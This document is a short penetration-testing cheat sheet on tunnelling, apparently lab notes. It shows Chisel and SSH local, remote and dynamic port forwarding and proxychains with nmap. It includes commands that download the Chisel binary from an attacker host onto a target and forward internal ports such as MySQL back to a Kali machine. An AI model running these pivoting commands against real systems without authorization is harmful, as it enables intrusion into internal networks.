# Tunnelling

## Chisel

| Info                                     | Command                                                   |
| ---------------------------------------- | --------------------------------------------------------- |
| Copy binary to guest                     | `wget http://$lhost/chisel`                               |
| Make binary executeable                  | `chmod 777 chisel`                                        |
| Kali Host (Listen on 9050 Forware 10000) | `chisel server -p 9050 --reverse`                         |
| Linux Target (Forward port 10000)        | `./chisel client 10.10.0.63:9050 R:10000:127.0.0.1:10000` |

## SSH

### Local Port Forward

Connect to 10.11.0.128 via ssh using the student account. Any traffic on the kali host on port 445 will be redirected to 192.168.1.110:445

`sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128`

### **Remote Port Forward**

SSH out to kali machine at 10.11.0.4 The local port 3306 on the target will become port 2221 on the kali machine

`ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4`

### **Dynamic Port Forward**

SSH dynamic port forwarding allows us to set a local listening port and have it tunnel incoming traffic to any remote destination through the use of a proxy.

<table><thead><tr><th width="374">Info</th><th width="468">Command</th></tr></thead><tbody><tr><td>Port 8888 is a local proxy that sends to the target</td><td><code>sudo ssh -N -D 127.0.0.1:8888 student@10.11.0.128</code></td></tr><tr><td>Configure proxy chains</td><td><code>cat /etc/proxychains.conf</code></td></tr><tr><td>Append to proxy chains config</td><td><code>socks4 127.0.0.1 8888</code></td></tr><tr><td>Used proxychains with nmap</td><td><code>sudo proxychains nmap --top-ports=20 -sT -Pn 192.168.1.110</code></td></tr></tbody></table>
